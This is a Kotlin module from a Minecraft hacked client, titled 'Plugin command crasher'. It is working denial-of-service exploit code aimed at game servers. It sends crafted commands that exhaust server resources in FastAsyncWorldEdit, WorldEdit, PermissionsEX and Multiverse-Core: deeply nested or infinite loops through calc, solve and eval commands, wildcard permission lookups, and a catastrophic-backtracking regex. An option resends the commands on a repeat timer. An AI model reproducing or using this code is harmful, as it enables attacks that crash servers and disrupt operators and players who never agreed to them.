package de.florianmichael.tarasande_crasher.module

import de.florianmichael.tarasande_crasher.forcePacket
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket
import net.tarasandedevelopment.tarasande.event.EventDisconnect
import net.tarasandedevelopment.tarasande.event.EventUpdate
import net.tarasandedevelopment.tarasande.system.base.valuesystem.impl.ValueBoolean
import net.tarasandedevelopment.tarasande.system.base.valuesystem.impl.ValueMode
import net.tarasandedevelopment.tarasande.system.base.valuesystem.impl.ValueNumber
import net.tarasandedevelopment.tarasande.system.feature.modulesystem.Module
import net.tarasandedevelopment.tarasande.util.math.TimeUtil
import net.tarasandedevelopment.tarasande.util.player.PlayerUtil
import org.apache.commons.lang3.RandomStringUtils
import java.util.concurrent.ThreadLocalRandom

val mvCommands = mutableListOf(
    "mv",
    "multiverse-core:mv",
    "multiverse-core:multiverse-core",
    "mv:multiverse-core"
)

class ModulePluginCommandCrasher : Module("Plugin command crasher", "Crashes some known plugins using commands", "Crasher") {

    private val plugin = ValueMode(this, "Plugin", false, "FastAsyncWorldEdit", "WorldEdit", "PermissionsEX", "Multiverse-Core")

    private val repeat = ValueBoolean(this, "Repeat", false)
    private val repeatDelay = ValueNumber(this, "Repeat delay", 500.0, 1000.0, 50000.0, 500.0, isEnabled = { repeat.value })

    private val mathCommand = ValueMode(this, "Math command", false, "//calc", "//solve", "//worldedit:/eval", isEnabled = { plugin.isSelected(1) })

    private val searchMode = ValueMode(this, "Search mode", false, "Promote", "Demote", isEnabled = { plugin.isSelected(2) })
    private val searchType = ValueMode(this, "Search type", false, "Alphanumeric", "Numeric", isEnabled = { plugin.isSelected(2) })

    private val regexCount = ValueNumber(this, "Regex count", 5.0, 25.0, 30.0, 1.0, isEnabled = { plugin.isSelected(3) })

    private val timer = TimeUtil()

    init {
        registerEvent(EventDisconnect::class.java) {
            switchState()
        }
        registerEvent(EventUpdate::class.java) {
            if (repeat.value) {
                if (timer.hasReached(repeatDelay.value.toLong())) {
                    execute()
                    timer.reset()
                }
            }
        }
    }

    override fun onEnable() {
        super.onEnable()
        if (!repeat.value) execute()
    }

    private fun execute() {
        if (plugin.isSelected(0)) {
            forcePacket(RequestCommandCompletionsC2SPacket(0, "/to for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}"))
            return
        }
        if (plugin.isSelected(1)) {
            if (mathCommand.isSelected(0)) {
                PlayerUtil.sendChatMessage("//calc for(i=0;i<256;i++){for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<256;c++){}}}}", true)
            } else if (mathCommand.isSelected(1)) {
                PlayerUtil.sendChatMessage("//solve for(i=0;i<256;i++){for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<256;c++){}}}}", true)
            } else if (mathCommand.isSelected(2)) {
                PlayerUtil.sendChatMessage("/worldedit:/eval for(i=0;i<256;i+=0){}", true)
            }
            return
        }
        if (plugin.isSelected(2)) {
            val search = if (searchType.isSelected(0)) RandomStringUtils.randomAlphanumeric(1) else RandomStringUtils.randomNumeric(1)
            PlayerUtil.sendChatMessage("/pex " + (if (searchMode.isSelected(0)) "promote" else "demote") + " " + search, true)
            return
        }
        if (plugin.isSelected(3)) {
            PlayerUtil.sendChatMessage("/" + mvCommands[ThreadLocalRandom.current().nextInt(mvCommands.size)] + " ^(" + ".*".repeat(regexCount.value.toInt()) + ".++)\$^", true)
            return
        }
    }
}
